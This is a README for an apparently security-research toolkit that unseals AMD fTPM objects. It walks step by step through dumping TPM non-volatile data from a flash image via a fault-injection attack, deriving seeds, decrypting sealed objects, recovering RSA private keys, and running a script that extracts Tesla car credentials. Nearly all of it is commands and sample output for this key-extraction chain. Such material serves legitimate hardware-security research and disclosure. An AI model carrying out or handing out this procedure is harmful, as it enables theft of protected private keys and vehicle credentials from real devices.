# Unsealing AMD fTPM Objects

## Installation

 1. create a python venv: `$ python3 -m venv venv`
 2. enter venv: `$ . venv/bin/activate`
 3. update pip `$ pip install -U pip`
 4. install amd-nv-tool:
  ```
  $ git submodule init
  $ git submodule update
  $ pip install ./amd-nv-tool
  $ pip install ./PSPTool
  ```
 5. install other components: `pip install -r requirements.txt`

**Note:** Maybe you will experience issues using the `pip install psptool` variant of psptool, so install it manually in the order provided above.

## Usage

To unseal a general tpm object: 
 1. use [amdnvtool](./amd-nv-tool) (and the associated fi attack) to dump the tpm-nv-data as json:
  ```
  $ amdnvtool flash-image.bin -s 17a6...f8fe >nvdata.json
  ```
 2. generate the primary objects `seedValue` from the template:
  ```
  $ python gen_prim_seed.py nvdata.json 0023000b00030472000000060080004300100003001000000000 0x20
  6fab...54b5
  ```
 3. unseal a tpm object using the parent's `seedValue`:
  ```
  $ python tpm_obj.py 6fab...54b5 tpm_object.pub_bytes tpm_object.priv_bytes
  TPM_KEYS {
    hmac_key = 974f...ff30
    aes_key(name) = cfa...596
  }

  TPM_2B_PUBLIC {
    algorithm = 0x0001
    name_alg = 0x000b
    attributes = 0x00060472
    auth_policy = 
    params = TpmSRsaParms(symmetric=16, scheme=16, key_bits=2048, exponent=65537)
    unique = Tpm2bPublicKeyRsa(length=256, modulus=2520...1377)
  }

  TPM_2B_PRIVATE {
    hmac = 03cb...edd7
    iv = e20...204
    sensitive = 6681...24da
  }

  TPM_2B_SENSITIVE {
    algorithm = 0x0001
    auth = 0000...0000
    seed = 
    sensitive = Tpm2bPrivateKeyRsa(bits=1024, prime_p=1640...4841)
  }
  ```
 3. if it's an RSA key, then recover the private key from the modulus and prime p:
  ```
  $ python recover_rsa_key.py 2520...1377 1640...4841 recovered.key
  $ cat recovered.key
  -----BEGIN PRIVATE KEY-----
  MIIE...
  ```

## Tesla car creds

For tesla car creds there is an all-in-one script:
```
Usage:
  unseal-tesla-car-creds.py <command> [<args ...>]
Commands:

  from-nvdata <nvdata.json> <car-creds.key> [<car-creds-unsealed.key>]
  from-image <flash-image.bin> <secret (hex)> <car-creds.key> [<car-creds-unsealed.key>]

```
